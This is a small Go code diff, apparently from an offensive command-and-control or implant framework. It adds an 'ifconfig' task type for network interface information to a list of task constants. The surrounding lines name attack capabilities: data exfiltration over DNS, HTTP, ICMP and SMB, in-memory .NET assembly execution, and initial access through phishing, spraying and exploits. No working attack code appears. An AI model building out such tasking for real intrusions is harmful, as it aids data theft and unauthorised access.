@@ -41,6 +41,7 @@ const (
 	TaskExfil       uint8 = 25  // Data exfiltration (DNS, HTTP, ICMP, SMB)
 	TaskAssembly    uint8 = 26  // .NET assembly execution (in-memory)
 	TaskInitAccess  uint8 = 27  // Initial access commands (phish, spray, exploit)
+	TaskIfconfig    uint8 = 28  // Network interface information
 )
 
 // Task status
@@ -115,6 +116,8 @@ func TaskTypeName(t uint8) string {
 		return "assembly"
 	case TaskInitAccess:
 		return "initaccess"
+	case TaskIfconfig:
+		return "ifconfig"
 	default:
 		return "unknown"
 	}
